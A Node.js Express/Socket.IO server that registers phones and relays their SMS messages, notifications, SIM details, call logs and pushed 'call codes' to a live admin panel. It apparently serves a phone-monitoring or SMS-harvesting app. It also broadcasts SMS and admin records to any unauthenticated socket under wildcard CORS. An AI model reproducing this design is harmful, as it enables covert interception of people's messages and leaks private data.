// server.js
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// ROUTES
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import authRoutes from "./routes/authRoutes.js";
import logRoutes from "./routes/logRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

import { initAdminPassword } from "./controllers/authController.js";

// MODELS
import Sms from "./models/Sms.js";
import Notification from "./models/Notification.js";
import Device from "./models/Device.js";

dotenv.config();
connectDB();

// --------------------------------------------------
const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// --------------------------------------------------
function cleanId(id) {
  if (!id) return null;
  return id.toString().trim().toUpperCase();
}

const deviceSockets = new Map(); // device → socket
const watchers = new Map(); // UI listeners

function notifyWatchers(uniqueid, payload) {
  const set = watchers.get(uniqueid);
  if (!set) return;
  for (let sid of set) io.to(sid).emit("deviceRealtime", payload);
}

// --------------------------------------------------
io.on("connection", (socket) => {
  console.log("🟢 CONNECTED:", socket.id);
  let currentUniqueId = null;

  // UI WATCH DEVICE
  socket.on("watchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    if (!watchers.has(id)) watchers.set(id, new Set());
    watchers.get(id).add(socket.id);
    console.log("👁 UI Watching:", id);
  });

  socket.on("unwatchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    if (watchers.has(id)) watchers.get(id).delete(socket.id);
  });

  // ⭐⭐⭐ DEVICE REGISTER (UPSERT + SNAPSHOT) ⭐⭐⭐
  socket.on("registerDevice", async (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;
    console.log("🔗 Device Registered:", id);

    deviceSockets.set(id, socket.id);
    currentUniqueId = id;
    socket.join(id);

    // ⭐ UPSERT DEVICE IN DATABASE ⭐
    const deviceDoc = await Device.findOneAndUpdate(
      { uniqueid: id },
      {
        uniqueid: id,
        connectivity: "Online",
        lastSeenAt: new Date(),
      },
      { upsert: true, new: true }
    );

    saveLastSeen(id, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });

    const payload = {
      uniqueid: id,
      connectivity: "Online",
      updatedAt: new Date(),
    };

    io.emit("deviceStatus", payload);
    notifyWatchers(id, payload);

    // ⭐ SEND SNAPSHOT TO UI (SO CARD ADDS LIVE)
    io.emit("deviceUpdateGlobal", deviceDoc);
    io.to(id).emit("deviceUpdate", deviceDoc);
    notifyWatchers(id, { type: "device", ...deviceDoc });
  });

  // ⭐⭐⭐ DEVICE HEARTBEAT ⭐⭐⭐
  socket.on("deviceStatus", async (data = {}) => {
    const id = cleanId(data.uniqueid);
    if (!id) return;

    const connectivity = data.connectivity || "Online";

    const updated = await Device.findOneAndUpdate(
      { uniqueid: id },
      { connectivity, lastSeenAt: new Date() },
      { new: true }
    );

    saveLastSeen(id, connectivity);

    io.emit("deviceStatus", {
      uniqueid: id,
      connectivity,
      updatedAt: new Date(),
    });

    notifyWatchers(id, {
      uniqueid: id,
      connectivity,
      updatedAt: new Date(),
    });

    // ⭐ SEND SNAPSHOT AGAIN FOR PANEL LIVE UPDATE
    io.emit("deviceUpdateGlobal", updated);
    io.to(id).emit("deviceUpdate", updated);
    notifyWatchers(id, { type: "device", ...updated });
  });

  // DEVICE DISCONNECT
  socket.on("disconnect", async () => {
    console.log("🔴 SOCKET DISCONNECTED:", socket.id);

    if (currentUniqueId) {
      const id = currentUniqueId;
      const last = deviceSockets.get(id);

      if (last === socket.id) {
        deviceSockets.delete(id);

        const updated = await Device.findOneAndUpdate(
          { uniqueid: id },
          { connectivity: "Offline", lastSeenAt: new Date() },
          { new: true }
        );

        io.emit("deviceStatus", {
          uniqueid: id,
          connectivity: "Offline",
          updatedAt: new Date(),
        });

        notifyWatchers(id, {
          uniqueid: id,
          connectivity: "Offline",
          updatedAt: new Date(),
        });

        // full snapshot offline update
        io.emit("deviceUpdateGlobal", updated);
        io.to(id).emit("deviceUpdate", updated);
      }
    }

    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// --------------------------------------------------
async function saveLastSeen(uniqueid, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// --------------------------------------------------
export function sendCallCodeToDevice(rawId, data) {
  const id = cleanId(rawId);
  if (!id) return;
  io.to(id).emit("callCodeUpdate", data);
  notifyWatchers(id, { type: "call", ...data });
}

export function sendAdminGlobal(data) {
  io.emit("adminUpdate", data);
}

// --------------------------------------------------
// MONGO STREAMS
// --------------------------------------------------
mongoose.connection.once("open", async () => {
  console.log("📡 Mongo Streams ACTIVE");
  await initAdminPassword();

  function watch(collection, cb) {
    const start = () => {
      try {
        const stream = mongoose.connection.collection(collection).watch();

        stream.on("change", async (chg) => {
          if (!["insert", "update", "replace"].includes(chg.operationType)) return;
          const doc = await mongoose.connection
            .collection(collection)
            .findOne({ _id: chg.documentKey._id });
          if (doc) cb(doc);
        });

        stream.on("error", () => setTimeout(start, 2000));
      } catch (e) {
        setTimeout(start, 2000);
      }
    };
    start();
  }

  // DEVICE STREAM
  watch("devices", (doc) => {
    const id = cleanId(doc.uniqueid);
    if (!id) return;
    io.emit("deviceUpdateGlobal", doc);
    io.to(id).emit("deviceUpdate", doc);
    notifyWatchers(id, { type: "device", ...doc });
  });

  // NOTIFICATION STREAM
  watch("notifications", (doc) => {
    const id = cleanId(doc.uniqueid);
    io.to(id).emit("notificationUpdate", doc);
    notifyWatchers(id, { type: "notification", ...doc });
    io.emit("notificationGlobal", doc);
  });

  // SMS STREAM
  try {
    const smsStream = Sms.watch();
    smsStream.on("change", async (chg) => {
      if (!["insert", "update", "replace"].includes(chg.operationType)) return;
      const docId = chg.documentKey?._id;
      if (!docId) return;
      const doc = await Sms.findById(docId).lean();
      if (!doc || !doc.uniqueid) return;

      const id = cleanId(doc.uniqueid);

      io.to(id).emit("smsUpdate", doc);
      notifyWatchers(id, { type: "sms", ...doc });
      io.emit("smsGlobal", doc);
    });
  } catch (e) {
    console.log("SMS Watch Error:", e.message);
  }

  watch("admins", (doc) => sendAdminGlobal(doc));
  watch("siminfos", (doc) => io.emit("simInfoUpdated", doc));
  watch("callcodes", (doc) => sendCallCodeToDevice(doc.uniqueid, doc));
});

// --------------------------------------------------
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/action", logRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);
app.use("/api/auth", authRoutes);

app.get("/", (req, res) => res.send("Real-time Backend Running"));

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`Server Running on PORT ${PORT}`);
});
